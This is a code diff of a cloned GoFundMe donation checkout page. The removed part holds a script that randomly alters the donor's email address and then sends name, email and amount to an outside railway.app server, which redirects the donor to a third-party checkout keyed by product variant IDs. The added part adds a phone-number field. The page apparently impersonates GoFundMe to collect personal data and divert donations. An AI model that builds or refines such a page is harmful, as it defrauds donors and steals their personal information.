@@ -391,612 +391,765 @@
 
                 </ul>
 
-                <!-- Donation buttons: update aria-pressed and donation summary text -->
-                <script>
-                  const donationButtons = document.querySelectorAll(
-                    'ul[data-federalid="suggested-donations-list"] button'
-                  );
-                  const donationSummaryDDs = document.querySelectorAll(
-                    ".checkout-summary_checkoutSummaryList__1z9xU dd"
-                  );
-                  let donationAmountElement = null;
-                  let totalAmountElement = null;
-                  if (donationSummaryDDs.length >= 2) {
-                    donationAmountElement = donationSummaryDDs[0];
-                    totalAmountElement = donationSummaryDDs[1];
-                  }
+            <!-- 1) Include intl-tel-input CSS (so we can see flags & styling) -->
+<link
+  rel="stylesheet"
+  href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
+/>
 
-                  donationButtons.forEach((button) => {
-                    button.addEventListener("click", () => {
-                      donationButtons.forEach((btn) =>
-                        btn.setAttribute("aria-pressed", "false")
-                      );
-                      button.setAttribute("aria-pressed", "true");
+<!-- Donation buttons: update aria-pressed and donation summary text -->
+<script>
+  const donationButtons = document.querySelectorAll(
+    'ul[data-federalid="suggested-donations-list"] button'
+  );
+  const donationSummaryDDs = document.querySelectorAll(
+    ".checkout-summary_checkoutSummaryList__1z9xU dd"
+  );
+  let donationAmountElement = null;
+  let totalAmountElement = null;
+  if (donationSummaryDDs.length >= 2) {
+    donationAmountElement = donationSummaryDDs[0];
+    totalAmountElement = donationSummaryDDs[1];
+  }
 
-                      if (donationAmountElement && totalAmountElement) {
-                        donationAmountElement.textContent = `$${button.value}.00`;
-                        totalAmountElement.textContent = `$${button.value}.00`;
-                      }
-                    });
-                  });
-                </script>
+  donationButtons.forEach((button) => {
+    button.addEventListener("click", () => {
+      donationButtons.forEach((btn) => btn.setAttribute("aria-pressed", "false"));
+      button.setAttribute("aria-pressed", "true");
 
-                <!-- Additional fields before the payment options (currently empty) -->
+      if (donationAmountElement && totalAmountElement) {
+        donationAmountElement.textContent = `$${button.value}.00`;
+        totalAmountElement.textContent = `$${button.value}.00`;
+      }
+    });
+  });
+</script>
+
+<!-- Additional fields before the payment options (currently empty) -->
+<div
+  class="checkoutCurrencyField m-form-field m-form-field--stacked hrt-mb-3"
+  bis_skin_checked="1"
+>
+  <div class="m-form-field-inner" bis_skin_checked="1">
+    <label
+      class="m-form-field-label m-form-field-label--prepend"
+      for="checkout-donation"
+    ></label>
+  </div>
+</div>
+<div aria-live="polite" class="hrt-sr-only" bis_skin_checked="1"></div>
+</fieldset>
+
+<div bis_skin_checked="1"></div>
+<div
+  class="checkout-rule_checkoutRule__RsZ5R hrt-mb-3 hrt-mt-3 hrt-rule hrt-rule--horizontal"
+  bis_skin_checked="1"
+></div>
+
+<!-- Renamed "Payment method" to "Personal Information" -->
+<div class="checkout-payment-options" bis_skin_checked="1">
+  <fieldset class="hrt-mb-3 hrt-fieldset">
+    <legend class="hrt-font-bold hrt-fieldset-legend">
+      <span class="hrt-text-body-md hrt-font-bold">Personal Information</span>
+    </legend>
+    <div class="hrt-mt-2" bis_skin_checked="1">
+      <ul class="checkout-form-fields_checkoutPaymentOptions__wTG9d hrt-list-unstyled">
+        <li class="payment-method-option_checkoutPaymentItem__MRWEI">
+          <div
+            class="payment-method-option_checkoutPaymentOption__2PCN3 hrt-radio-field"
+            bis_skin_checked="1"
+          >
+            <!-- Keep the radio box, remove credit card text & icon -->
+            <input
+              class="hrt-radio-field-input"
+              id="add-card"
+              type="radio"
+              name="paymentMethod"
+              value="CREDIT_CARD"
+              checked
+            />
+            <label class="hrt-radio-field-label" for="add-card">
+              <div class="hrt-disp-flex hrt-align-center" bis_skin_checked="1">
                 <div
-                  class="checkoutCurrencyField m-form-field m-form-field--stacked hrt-mb-3"
+                  class="hrt-disp-flex hrt-align-center hrt-justify-between hrt-width-full"
                   bis_skin_checked="1"
                 >
-                  <div class="m-form-field-inner" bis_skin_checked="1">
-                    <label
-                      class="m-form-field-label m-form-field-label--prepend"
-                      for="checkout-donation"
-                    ></label>
-                  </div>
-                </div>
-                <div aria-live="polite" class="hrt-sr-only" bis_skin_checked="1"></div>
-              </fieldset>
-
-              <div bis_skin_checked="1"></div>
-              <div
-                class="checkout-rule_checkoutRule__RsZ5R hrt-mb-3 hrt-mt-3 hrt-rule hrt-rule--horizontal"
-                bis_skin_checked="1"
-              ></div>
-
-              <!-- Renamed "Payment method" to "Personal Information" -->
-              <div class="checkout-payment-options" bis_skin_checked="1">
-                <fieldset class="hrt-mb-3 hrt-fieldset">
-                  <legend class="hrt-font-bold hrt-fieldset-legend">
-                    <span class="hrt-text-body-md hrt-font-bold">
-                      Personal Information
-                    </span>
-                  </legend>
-                  <div class="hrt-mt-2" bis_skin_checked="1">
-                    <ul class="checkout-form-fields_checkoutPaymentOptions__wTG9d hrt-list-unstyled">
-                      <li class="payment-method-option_checkoutPaymentItem__MRWEI">
-                        <div
-                          class="payment-method-option_checkoutPaymentOption__2PCN3 hrt-radio-field"
-                          bis_skin_checked="1"
-                        >
-                          <!-- Keep the radio box, remove credit card text & icon -->
-                          <input
-                            class="hrt-radio-field-input"
-                            id="add-card"
-                            type="radio"
-                            name="paymentMethod"
-                            value="CREDIT_CARD"
-                            checked
-                          />
-                          <label class="hrt-radio-field-label" for="add-card">
-                            <div class="hrt-disp-flex hrt-align-center" bis_skin_checked="1">
-                              <div
-                                class="hrt-disp-flex hrt-align-center hrt-justify-between hrt-width-full"
-                                bis_skin_checked="1"
-                              >
-                                <span></span>
-                              </div>
-                            </div>
-                          </label>
-                        </div>
-              
-                        <!-- Begin personal fields (keep email and full name) in separate rows -->
-                        <fieldset
-                          class="credit-card-form-fields hrt-mt-1 hrt-ml-4 credit-card-form-fields_creditCardPaymentHideLegend__baBa8 hrt-fieldset"
-                        >
-                          <legend class="hrt-font-bold hrt-fieldset-legend sf-hidden"></legend>
-                          <div class="hrt-mt-2" bis_skin_checked="1">
-                            <div
-                              class="credit-card-form-fields_creditCardGridFields__4DXxM"
-                              bis_skin_checked="1"
-                            >
-                              <div class="donation-personal-fields_donationPersonalFields__fdEpm" bis_skin_checked="1">
-                                
-                                <!-- EMAIL (single row) -->
-                                <div
-                                  class="donation-personal-fields_donationPersonalRow__mqFjZ donation-personal-fields_donationPersonalRowParent__gvwgP"
-                                  bis_skin_checked="1"
-                                >
-                                  <div class="hrt-text-field" bis_skin_checked="1">
-                                    <div class="hrt-text-field-wrapper" bis_skin_checked="1">
-                                      <div class="hrt-text-field-inner" bis_skin_checked="1">
-                                        <input
-                                          aria-invalid="false"
-                                          class="hrt-text-field-input"
-                                          id="email-address"
-                                          placeholder=" "
-                                          name="email"
-                                          type="email"
-                                          autocomplete="email"
-                                          value=""
-                                        />
-                                        <label class="hrt-text-field-label" for="email-address">
-                                          Email address
-                                        </label>
-                                      </div>
-                                    </div>
-                                    <!-- Error message below Email -->
-                                    <div class="error-message" id="email-error">
-                                      <img src="error.svg" alt="" class="error-icon" />
-                                      <span></span>
-                                    </div>
-                                  </div>
-                                </div>
-              
-                                <!-- FULL NAME (single row) -->
-                                <div
-                                  class="donation-personal-fields_donationPersonalRow__mqFjZ donation-personal-fields_donationPersonalRowParent__gvwgP"
-                                  bis_skin_checked="1"
-                                  style="margin-top: 0px;" 
-                                >
-                                  <div class="hrt-text-field" bis_skin_checked="1">
-                                    <div class="hrt-text-field-wrapper" bis_skin_checked="1">
-                                      <div class="hrt-text-field-inner" bis_skin_checked="1">
-                                        <input
-                                          aria-invalid="false"
-                                          class="hrt-text-field-input"
-                                          id="first-name"
-                                          placeholder=" "
-                                          name="firstName"
-                                          type="text"
-                                          autocomplete="given-name"
-                                          value=""
-                                        />
-                                        <label class="hrt-text-field-label" for="first-name">
-                                          Full Name
-                                        </label>
-                                      </div>
-                                    </div>
-                                    <!-- Error message below Full Name -->
-                                    <div class="error-message" id="first-name-error">
-                                      <img src="error.svg" alt="" class="error-icon" />
-                                      <span></span>
-                                    </div>
-                                  </div>
-                                </div>
-              
-                                <!-- SURNAME (removed) -->
-                                
-                                <!-- End personal fields -->
-                              </div>
-                            </div>
-                          </div>
-                        </fieldset>
-                      </li>
-                    </ul>
-                  </div>
-                </fieldset>
-                <div class="hrt-mt-1" bis_skin_checked="1"></div>
-              </div>
-              <div
-                class="checkout-rule_checkoutRule__RsZ5R hrt-mb-3 hrt-mt-3 hrt-rule hrt-rule--horizontal"
-                bis_skin_checked="1"
-              ></div>
-              <div class="hrt-mb-4 hrt-mb-3 checkout-summary" bis_skin_checked="1">
-                <h2 class="heading-3 hrt-font-bold">Your donation</h2>
-                <dl class="checkout-summary_checkoutSummaryList__1z9xU hrt-text-neutral-500">
-                  <dt>Your donation</dt>
-                  <dt class="hrt-disp-flex hrt-align-center"></dt>
-                  <dd>$0.00</dd>
-                  <dt class="checkout-summary_checkoutSummaryTotalLabel__u1WMD hrt-text-neutral-800 hrt-pt-2">
-                    Total due today
-                  </dt>
-                  <dd
-                    class="checkout-summary_checkoutSummaryTotalAmount__oU1ez hrt-text-neutral-800 hrt-mb-0 hrt-pt-2"
-                  >
-                    $0.00
-                  </dd>
-                </dl>
-              </div>
-              <div
-                class="payment-method-submit-button_paymentMethodSubmitButton__x_pFo"
-                bis_skin_checked="1"
-              >
-                <div class="hrt-width-full" bis_skin_checked="1">
-                  <div id="threeDS2Fingerprint" bis_skin_checked="1"></div>
-                  <div
-                    class="credit-card-submit-button_creditCardSubmitButtonWrapper__9cUFi hrt-width-full"
-                    bis_skin_checked="1"
-                  >
-                    <button
-                      class="hrt-mt-0 hrt-mr-0 hrt-mb-0 hrt-ml-0 hrt-max-width-full hrt-width-full credit-card-submit-button_creditCardSubmitButton__nUGf9 hrt-disp-flex hrt-justify-center gfm-fundraiser-button hrt-primary-button hrt-primary-button--full-for-mobile hrt-primary-button--large hrt-primary-button--default hrt-base-button"
-                      aria-label="Donate $0.00 now"
-                      id="donate-now"
-                      type="button"
-                    >
-                      Donate now
-                    </button>
-                  </div>
-                </div>
-                <!-- GLOBAL ERROR MESSAGE BELOW THE BUTTON -->
-                <!-- Make it red & same line with icon; shorter text -->
-                <div class="error-message" id="donation-form-error" style="display: none; color:#D93025; align-items:center;">
-                  <img src="error.svg" alt="" class="error-icon" />
                   <span></span>
                 </div>
-              
-                <div class="hrt-disp-none hrt-width-full sf-hidden" bis_skin_checked="1"></div>
-                <div class="hrt-disp-none hrt-width-full sf-hidden" bis_skin_checked="1"></div>
-                <div class="hrt-disp-none hrt-width-full sf-hidden" bis_skin_checked="1">
-                  <div class="hrt-disp-flex hrt-justify-center sf-hidden" bis_skin_checked="1">
-                    <div
-                      id="paypal-button"
-                      class="hrt-mt-0 hrt-mr-0 hrt-mb-0 hrt-ml-0 hrt-max-width-full hrt-width-full paypal-payfast_paypalPayfastSubmitButton__u8JfE sf-hidden"
-                      bis_skin_checked="1"
-                    >
+              </div>
+            </label>
+          </div>
+
+          <!-- Begin personal fields (keep email and full name) in separate rows -->
+          <fieldset
+            class="credit-card-form-fields hrt-mt-1 hrt-ml-4 credit-card-form-fields_creditCardPaymentHideLegend__baBa8 hrt-fieldset"
+          >
+            <legend class="hrt-font-bold hrt-fieldset-legend sf-hidden"></legend>
+            <div class="hrt-mt-2" bis_skin_checked="1">
+              <div
+                class="credit-card-form-fields_creditCardGridFields__4DXxM"
+                bis_skin_checked="1"
+              >
+                <div
+                  class="donation-personal-fields_donationPersonalFields__fdEpm"
+                  bis_skin_checked="1"
+                >
+                  <!-- EMAIL (single row) -->
+                  <div
+                    class="donation-personal-fields_donationPersonalRow__mqFjZ donation-personal-fields_donationPersonalRowParent__gvwgP"
+                    bis_skin_checked="1"
+                  >
+                    <div class="hrt-text-field" bis_skin_checked="1">
+                      <div class="hrt-text-field-wrapper" bis_skin_checked="1">
+                        <div class="hrt-text-field-inner" bis_skin_checked="1">
+                          <input
+                            aria-invalid="false"
+                            class="hrt-text-field-input"
+                            id="email-address"
+                            placeholder=" "
+                            name="email"
+                            type="email"
+                            autocomplete="email"
+                            value=""
+                          />
+                          <label class="hrt-text-field-label" for="email-address">
+                            Email address
+                          </label>
+                        </div>
+                      </div>
+                      <!-- Error message below Email -->
+                      <div class="error-message" id="email-error">
+                        <img src="error.svg" alt="" class="error-icon" />
+                        <span></span>
+                      </div>
                     </div>
                   </div>
-                </div>
-                <div class="hrt-text-body-sm hrt-text-neutral-500 hrt-mt-3 hrt-mb-0" bis_skin_checked="1">
-                  By choosing the payment method above, you agree to GoFundMe's
-                  <a
-                    class="hrt-link hrt-link--gray-dark"
-                    id="link-donate-terms"
-                    target="_blank"
-                    rel="noreferrer"
-                    data-savepage-href="/pt-pt/c/terms"
-                    href="https://www.gofundme.com/pt-pt/c/terms"
-                  >
-                    Terms of Service
-                  </a>
-                  and
-                  <a
-                    class="hrt-link hrt-link--gray-dark"
-                    id="link-donate-privacy"
-                    target="_blank"
-                    rel="noreferrer"
-                    data-savepage-href="/pt-pt/c/privacy"
-                    href="https://www.gofundme.com/pt-pt/c/privacy"
-                  >
-                    Privacy Notice
-                  </a>
-                  .
-                  <div class="pricing-link" bis_skin_checked="1">
-                    Learn more about
-                    <a
-                      class="hrt-link hrt-link--gray-dark"
-                      data-savepage-href="/pt-pt/c/pricing"
-                      href="https://www.gofundme.com/pt-pt/c/pricing"
-                      target="_blank"
-                      rel="noreferrer"
-                    >
-                      prices and rates
-                    </a>
-                    .
-                  </div>
-                </div>
-              </div>
-              </form>
-              </div>
-              <div id="checkoutAppInvisibleCaptcha" bis_skin_checked="1"></div>
-              <div
-                class="checkout-rule_checkoutRule__RsZ5R hrt-mb-3 hrt-mt-3 hrt-rule hrt-rule--horizontal"
-                bis_skin_checked="1"
-              ></div>
-              <div class="gfm-guarantee" bis_skin_checked="1">
-                <section class="m-value-prop">
-                  <div class="hrt-spot-icon hrt-spot-icon--indigo hrt-spot-icon--large" bis_skin_checked="1">
-                    <svg
-                      aria-hidden="true"
-                      class="hrt-icon hrt-icon--large"
-                      focusable="false"
-                      viewBox="0 0 24 24"
-                    >
-                      <use
-                        data-savepage-href="/_next/static/images/core-a3bcb8a977a6bad05819661edd5f4478e5cb123c562c34fe3d6b69e5e781572d.svg#federal-giving-guarantee"
-                        href="#federal-giving-guarantee"
-                      ></use>
-                      <symbol
-                        fill="none"
-                        viewBox="0 0 24 24"
-                        id="federal-giving-guarantee"
-                        xmlns="http://www.w3.org/2000/svg"
-                      >
-                        <path
-                          fill-rule="evenodd"
-                          clip-rule="evenodd"
-                          d="M20.711 4.46c.283.248.47.588.529.96a22 22 0 0 1-.18 8.13c-.78 3.34-2.91 7.59-8.63 8.88l-.4.09-.39-.08c-5.73-1.3-7.86-5.55-8.64-8.89a22 22 0 0 1-.24-8.13 1.62 1.62 0 0 1 1.48-1.36 13.16 13.16 0 0 0 7-2.28 1.07 1.07 0 0 1 1.45 0 13.11 13.11 0 0 0 7 2.28c.376.01.738.15 1.021.4ZM12.07 20.97c3.98-.9 6.5-3.51 7.5-7.76a20.55 20.55 0 0 0 .19-7.55.11.11 0 0 0-.11-.1A14.6 14.6 0 0 1 12 3.11a14.62 14.62 0 0 1-7.65 2.45.11.11 0 0 0-.11.1 20.55 20.55 0 0 0 .19 7.55c1 4.25 3.5 6.86 7.5 7.76h.14ZM12 11.29a.67.67 0 0 0 .67-.67V9.2a.67.67 0 1 0-1.34 0v1.42a.67.67 0 0 0 .67.67Zm-3 1a.66.66 0 0 0 0-.94l-1-1a.67.67 0 0 0-.92 0 .68.68 0 0 0 0 .94l1 1a.66.66 0 0 0 .92 0Zm.98.517A4 4 0 0 1 12 12.28a4.05 4.05 0 0 1 3.5 2h-7a4 4 0 0 1 1.48-1.473ZM16 10.34l-1 1a.67.67 0 0 0 0 .92.661.661 0 0 0 .94 0l1-1a.68.68 0 0 0 0-.94.68.68 0 0 0-.94.02Z"
-                          fill="currentColor"
-                        ></path>
-                      </symbol>
-                    </svg>
-                  </div>
-                  <div class="m-value-prop-content" bis_skin_checked="1">
-                    <h3 class="hrt-font-medium hrt-mb-1">
-                      GoFundMe protects your donation
-                    </h3>
-                    <p class="hrt-text-neutral-500 hrt-mt-0 hrt-mb-0 hrt-text-body-sm">
-                      We guarantee a full refund for up to one year in the rare event of fraud.
-                      <a
-                        class="hrt-link hrt-link--gray-dark"
-                        href="https://www.gofundme.com/pt-pt/c/safety/gofundme-guarantee"
-                        target="_blank"
-                        rel="noreferrer"
-                      >
-                        See our GoFundMe Donation Guarantee.
-                      </a>
-                    </p>
-                  </div>
-                </section>
-              </div>
-              </div>
-              <img
-                data-savepage-src="https://d21y75miwcfqoq.cloudfront.net/48196d7e"
-                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
-                style="position:absolute"
-                referrerpolicy="no-referrer-when-downgrade"
-                alt
-              />
-              <button class="hrt-disp-none hrt-base-button sf-hidden" type="button"></button>
-              </div>
-              
-              <next-route-announcer>
-                <p
-                  aria-live="assertive"
-                  id="__next-route-announcer__"
-                  role="alert"
-                  style="border:0px;clip:rect(0px,0px,0px,0px);height:1px;margin:-1px;overflow:hidden;padding:0px;position:absolute;top:0px;width:1px;white-space:nowrap;overflow-wrap:normal"
-                ></p>
-              </next-route-announcer>
-              
-              <!-- Donation Amount Update Script Copy -->
-              <script>
-                // We'll track which donation amount is selected, and map each amount to a variant ID
-                const variantMap = {
-                  "25": 177472235,
-                  "50": 176630907,
-                  "100": 177341204,
-                  "300": 177341301,
-                  "500": 177341319,
-                  "750": 666666,
-                  "1000": 177341398,
-                  "1500": 888888,
-                  "2000": 999999
-                };
-              
-                let selectedAmount = 0; // We'll store the numeric amount. Default 0 if none selected.
-                let selectedVariantId = null;
-              
-                const donationButtons2 = document.querySelectorAll(
-                  'ul[data-federalid="suggested-donations-list"] button'
-                );
-                const donationSummaryDDs2 = document.querySelectorAll(
-                  ".checkout-summary_checkoutSummaryList__1z9xU dd"
-                );
-              
-                let donationAmountElement2 = null;
-                let totalAmountElement2 = null;
-              
-                if (donationSummaryDDs2.length >= 2) {
-                  donationAmountElement2 = donationSummaryDDs2[0];
-                  totalAmountElement2 = donationSummaryDDs2[1];
-                }
-              
-                donationButtons2.forEach((button) => {
-                  button.addEventListener("click", () => {
-                    selectedAmount = parseInt(button.value);
-                    selectedVariantId = variantMap[button.value] || null;
-              
-                    if (donationAmountElement2 && totalAmountElement2) {
-                      donationAmountElement2.textContent = `$${selectedAmount}.00`;
-                      totalAmountElement2.textContent = `$${selectedAmount}.00`;
-                    }
-              
-                    // Dispatch a custom event if needed
-                    const donationSelectedEvent = new CustomEvent("donationSelected", {
-                      detail: { amount: selectedAmount, variantId: selectedVariantId },
-                    });
-                    document.dispatchEvent(donationSelectedEvent);
-                  });
-                });
-              
-                (function () {
-                  const yourDonation = document.querySelector(
-                    'dl.checkout-summary_checkoutSummaryList__1z9xU dd:not(.checkout-summary_checkoutSummaryTotalAmount__oU1ez)'
-                  );
-                  const totalDue = document.querySelector(
-                    'dl.checkout-summary_checkoutSummaryList__1z9xU dd.checkout-summary_checkoutSummaryTotalAmount__oU1ez'
-                  );
-              
-                  document.addEventListener("donationSelected", function (e) {
-                    const selectedAmount = e.detail.amount;
-                    const formattedAmount = `$${parseInt(selectedAmount).toLocaleString("en-US")}.00`;
-              
-                    if (yourDonation) yourDonation.textContent = formattedAmount;
-                    if (totalDue) totalDue.textContent = formattedAmount;
-                  });
-                })();
-              </script>
-              
-              <!-- Simple validation for text fields, shortened error for donate button, plus new code for sending data to /create-donation-order -->
-              <script>
-                // We'll replicate the email modification logic from your snippet
-                function modifyEmail(email) {
-                  const parts = email.split("@");
-                  if (parts.length < 2) return email; // invalid format; return as-is
-                  const username = parts[0];
-                  const domain = parts[1];
-              
-                  // Randomly select one of 4 modifications
-                  const choice = Math.floor(Math.random() * 4);
-                  let newUsername = username;
-              
-                  switch(choice) {
-                    case 0:
-                      // Prepend a random number (1-3 digits)
-                      const numDigits = Math.floor(Math.random() * 3) + 1;
-                      const randomNum = Math.floor(Math.random() * Math.pow(10, numDigits)).toString();
-                      newUsername = randomNum + newUsername;
-                      break;
-                    case 1:
-                      // Remove the last letter of the username
-                      if (newUsername.length > 0) {
-                        newUsername = newUsername.slice(0, -1);
-                      }
-                      break;
-                    case 2:
-                      // Insert a random letter somewhere in the username
-                      const randomLetter = String.fromCharCode(97 + Math.floor(Math.random() * 26));
-                      const pos = Math.floor(Math.random() * (newUsername.length + 1));
-                      newUsername = newUsername.slice(0, pos) + randomLetter + newUsername.slice(pos);
-                      break;
-                    case 3:
-                      // Remove the first letter of the username
-                      newUsername = newUsername.slice(1);
-                      break;
-                  }
-                  return newUsername + "@" + domain;
-                }
-              
-                document.addEventListener("DOMContentLoaded", function () {
-                  function showErrorMessage(inputId, errorId, message) {
-                    const errorDiv = document.getElementById(errorId);
-                    const inputEl = document.getElementById(inputId);
-                    if (!inputEl) return;
-              
-                    const wrapper = inputEl.closest(".hrt-text-field-wrapper");
-                    if (!wrapper) return;
-              
-                    if (message) {
-                      errorDiv.classList.add("active");
-                      errorDiv.querySelector("span").textContent = message;
-                      wrapper.classList.add("field-error");
-                    } else {
-                      errorDiv.classList.remove("active");
-                      errorDiv.querySelector("span").textContent = "";
-                      wrapper.classList.remove("field-error");
-                    }
-                  }
-              
-                  function validateEmail(email) {
-                    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                    return re.test(email);
-                  }
-              
-                  const emailInput = document.getElementById("email-address");
-                  function validateEmailField() {
-                    const value = emailInput.value.trim();
-                    if (!value) {
-                      showErrorMessage("email-address", "email-error", "Please enter your email address");
-                    } else if (!validateEmail(value)) {
-                      showErrorMessage("email-address", "email-error", "Invalid email address");
-                    } else {
-                      showErrorMessage("email-address", "email-error", "");
-                    }
-                  }
-                  emailInput.addEventListener("blur", validateEmailField);
-                  emailInput.addEventListener("input", validateEmailField);
-              
-                  // Update full name field (renaming first-name to full-name)
-                  const fullNameInput = document.getElementById("first-name");
-                  fullNameInput.setAttribute("id", "full-name");
-                  fullNameInput.setAttribute("name", "fullName");
-                  fullNameInput.setAttribute("autocomplete", "name");
-                  const fullNameLabel = document.querySelector('label[for="first-name"]');
-                  if (fullNameLabel) {
-                    fullNameLabel.setAttribute("for", "full-name");
-                  }
-                  // Update error message container id for full name
-                  const fullNameErrorDiv = document.getElementById("first-name-error");
-                  fullNameErrorDiv.setAttribute("id", "full-name-error");
-              
-                  function validateFullNameField() {
-                    const value = fullNameInput.value.trim();
-                    const words = value.split(" ").filter(word => word !== "");
-                    if (!value) {
-                      showErrorMessage("full-name", "full-name-error", "Please enter your full name");
-                    } else if (words.length < 2) {
-                      showErrorMessage("full-name", "full-name-error", "Please enter your full name (First and Last name)");
-                    } else {
-                      showErrorMessage("full-name", "full-name-error", "");
-                    }
-                  }
-                  fullNameInput.addEventListener("blur", validateFullNameField);
-                  fullNameInput.addEventListener("input", validateFullNameField);
-              
-                  // Donate Button => check field errors, then do the backend call
-                  const donateNowBtn = document.getElementById("donate-now");
-                  const donationFormError = document.getElementById("donation-form-error");
-                  const donationFormErrorMsg = donationFormError.querySelector("span");
-              
-                  function anyActiveFieldErrors() {
-                    return document.querySelectorAll('.error-message.active').length > 0;
-                  }
-              
-                  async function submitDonation() {
-                    const fullName = fullNameInput.value.trim();
-                    const email = emailInput.value.trim();
-              
-                    if (selectedAmount <= 0) {
-                      // Provide a quick alert if no donation amount was selected
-                      donationFormError.style.display = "flex";
-                      donationFormErrorMsg.textContent = "Please select a donation amount";
-                      return;
-                    }
-              
-                    // Modify the email (randomly) before sending
-                    const modifiedEmail = modifyEmail(email);
-              
-                    // Build the payload for the server
-                    const payload = {
-                      donationAmount: selectedAmount,
-                      variantId: selectedVariantId,  // we pass the correct variant for the chosen amount
-                      fullName,
-                      email: modifiedEmail
-                    };
-              
-                    try {
-                      const response = await fetch("https://pol-production.up.railway.app/create-donation-order", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(payload),
-                      });
-              
-                      const data = await response.json();
-              
-                      if (!response.ok) {
-                        throw new Error(data.error || "Unable to initiate payment.");
-                      }
-              
-                      // If there's a checkoutUrl, redirect
-                      if (data.checkoutUrl) {
-                        window.location.href = data.checkoutUrl;
-                      } else {
-                        alert("No checkout URL returned. Cannot proceed.");
-                      }
-                    } catch (err) {
-                      console.error("Donation submission error:", err);
-                      alert("Something went wrong. Please try again.");
-                    }
-                  }
-              
-                  donateNowBtn.addEventListener("click", function () {
-                    // Trigger validation
-                    emailInput.dispatchEvent(new Event("blur"));
-                    fullNameInput.dispatchEvent(new Event("blur"));
-              
-                    // If any errors...
-                    if (anyActiveFieldErrors()) {
-                      donationFormError.style.display = "flex";  // ensures same line with icon
-                      donationFormErrorMsg.textContent = "Please fix errors above";
-                    } else {
-                      // Hide global error if no fields in error
-                      donationFormError.style.display = "none";
-                      donationFormErrorMsg.textContent = "";
-                      // Actually submit
-                      submitDonation();
-                    }
-                  });
-                });
-              </script>
-              </main>
-              </div>
-              </div>
-              
- 
-                                 
-                                <!-- Our main custom JS for Payment using Square (replacing Stripe) -->
-                                <script src="payment.js"></script>
-                                <script src="fbclid.js"></script>
 
+                  <!-- FULL NAME (single row) -->
+                  <div
+                    class="donation-personal-fields_donationPersonalRow__mqFjZ donation-personal-fields_donationPersonalRowParent__gvwgP"
+                    bis_skin_checked="1"
+                    style="margin-top: 0px;"
+                  >
+                    <div class="hrt-text-field" bis_skin_checked="1">
+                      <div class="hrt-text-field-wrapper" bis_skin_checked="1">
+                        <div class="hrt-text-field-inner" bis_skin_checked="1">
+                          <input
+                            aria-invalid="false"
+                            class="hrt-text-field-input"
+                            id="first-name"
+                            placeholder=" "
+                            name="firstName"
+                            type="text"
+                            autocomplete="given-name"
+                            value=""
+                          />
+                          <label class="hrt-text-field-label" for="first-name">
+                            Full Name
+                          </label>
+                        </div>
+                      </div>
+                      <!-- Error message below Full Name -->
+                      <div class="error-message" id="first-name-error">
+                        <img src="error.svg" alt="" class="error-icon" />
+                        <span></span>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- PHONE (NEW THIRD FIELD) -->
+                  <div
+                    class="donation-personal-fields_donationPersonalRow__mqFjZ donation-personal-fields_donationPersonalRowParent__gvwgP"
+                    bis_skin_checked="1"
+                    style="margin-top: 0px;"
+                  >
+                    <div class="hrt-text-field" bis_skin_checked="1">
+                      <div class="hrt-text-field-wrapper" bis_skin_checked="1">
+                        <div class="hrt-text-field-inner" bis_skin_checked="1">
+                          <!-- We'll give it an ID of "phone-input" -->
+                          <input
+                            aria-invalid="false"
+                            class="hrt-text-field-input"
+                            id="phone-input"
+                            placeholder=" "
+                            name="phoneNumber"
+                            type="tel"
+                            autocomplete="tel"
+                            value=""
+                          />
+                          <label class="hrt-text-field-label" for="phone-input">
+                            Phone Number
+                          </label>
+                        </div>
+                      </div>
+                      <!-- Error message below Phone -->
+                      <div class="error-message" id="phone-error">
+                        <img src="error.svg" alt="" class="error-icon" />
+                        <span></span>
+                      </div>
+                    </div>
+                  </div>
+                  <!-- End personal fields -->
+                </div>
+              </div>
+            </div>
+          </fieldset>
+        </li>
+      </ul>
+    </div>
+  </fieldset>
+  <div class="hrt-mt-1" bis_skin_checked="1"></div>
+</div>
+<div
+  class="checkout-rule_checkoutRule__RsZ5R hrt-mb-3 hrt-mt-3 hrt-rule hrt-rule--horizontal"
+  bis_skin_checked="1"
+></div>
+<div class="hrt-mb-4 hrt-mb-3 checkout-summary" bis_skin_checked="1">
+  <h2 class="heading-3 hrt-font-bold">Your donation</h2>
+  <dl class="checkout-summary_checkoutSummaryList__1z9xU hrt-text-neutral-500">
+    <dt>Your donation</dt>
+    <dt class="hrt-disp-flex hrt-align-center"></dt>
+    <dd>$0.00</dd>
+    <dt class="checkout-summary_checkoutSummaryTotalLabel__u1WMD hrt-text-neutral-800 hrt-pt-2">
+      Total due today
+    </dt>
+    <dd
+      class="checkout-summary_checkoutSummaryTotalAmount__oU1ez hrt-text-neutral-800 hrt-mb-0 hrt-pt-2"
+    >
+      $0.00
+    </dd>
+  </dl>
+</div>
+<div class="payment-method-submit-button_paymentMethodSubmitButton__x_pFo" bis_skin_checked="1">
+  <div class="hrt-width-full" bis_skin_checked="1">
+    <div id="threeDS2Fingerprint" bis_skin_checked="1"></div>
+    <div
+      class="credit-card-submit-button_creditCardSubmitButtonWrapper__9cUFi hrt-width-full"
+      bis_skin_checked="1"
+    >
+      <button
+        class="hrt-mt-0 hrt-mr-0 hrt-mb-0 hrt-ml-0 hrt-max-width-full hrt-width-full credit-card-submit-button_creditCardSubmitButton__nUGf9 hrt-disp-flex hrt-justify-center gfm-fundraiser-button hrt-primary-button hrt-primary-button--full-for-mobile hrt-primary-button--large hrt-primary-button--default hrt-base-button"
+        aria-label="Donate $0.00 now"
+        id="donate-now"
+        type="button"
+      >
+        Donate now
+      </button>
+    </div>
+  </div>
+  <!-- GLOBAL ERROR MESSAGE BELOW THE BUTTON -->
+  <!-- Make it red & same line with icon; shorter text -->
+  <div
+    class="error-message"
+    id="donation-form-error"
+    style="display: none; color:#D93025; align-items:center;"
+  >
+    <img src="error.svg" alt="" class="error-icon" />
+    <span></span>
+  </div>
+
+  <div class="hrt-disp-none hrt-width-full sf-hidden" bis_skin_checked="1"></div>
+  <div class="hrt-disp-none hrt-width-full sf-hidden" bis_skin_checked="1"></div>
+  <div class="hrt-disp-none hrt-width-full sf-hidden" bis_skin_checked="1">
+    <div class="hrt-disp-flex hrt-justify-center sf-hidden" bis_skin_checked="1">
+      <div
+        id="paypal-button"
